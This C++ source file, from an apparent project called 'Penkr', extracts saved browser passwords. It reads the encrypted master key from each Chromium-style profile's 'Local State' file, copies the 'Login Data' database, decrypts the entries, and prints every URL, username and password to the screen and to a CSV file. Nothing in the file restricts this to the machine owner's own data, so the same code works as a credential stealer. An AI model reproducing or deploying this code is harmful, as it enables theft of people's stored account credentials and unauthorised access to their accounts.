#include "pch.hpp"
#include "main.hpp"

#include "directories.hpp"
#include "utils.hpp"
#include "csvpass.hpp"
#include "db.hpp"

#include <filesystem>

#ifdef KTN_PLATFORM_WINDOWS
#include <Windows.h>
#include <ShlObj.h>
#endif



namespace Penkr
{
    int Main(int _argc, char** _argv)
    {
        CsvPass csv(Utils::GetPassFile());

        for (const auto& dir : Directories)
        {
            std::filesystem::path userDataDir, defaultDir;
            if (!Utils::GetAbsolutePath(dir, userDataDir, defaultDir)) continue;

            std::filesystem::path userFile = userDataDir / "Local State";
            std::string data = Utils::ReadFile(userFile);
            auto pos = data.find("encrypted_key");
            if (pos == std::string::npos)
            {
                std::cout << "Failed to find encrypted key!\n";
                continue;
            }
            pos += 16;
            auto endPos = data.find('"', pos);
            if (endPos == std::string::npos)
            {
                std::cout << "Error\n";
                continue;
            }

            std::string key = Utils::GetKey(data.substr(pos, endPos - pos));
            
            std::cout << dir.string() << ":\n";

            std::filesystem::path dbFile = defaultDir / "Login Data";

            std::filesystem::path localDbFile = "data.db";

            if (std::filesystem::exists(localDbFile))
                std::filesystem::remove(localDbFile);
            std::filesystem::copy_file(dbFile, localDbFile);

            PenkrDB db(localDbFile, key);
            for (auto& value : db)
            {
                if (!value) continue;

                std::cout << "url: " << value.Url << "\nname: " << value.Username << "\nCipher: " << value.Password << "\n\n";
                csv.Next(value.Url, value.Username, value.Password);
            }

            std::filesystem::remove(localDbFile);

        }

        return 0;
    }
}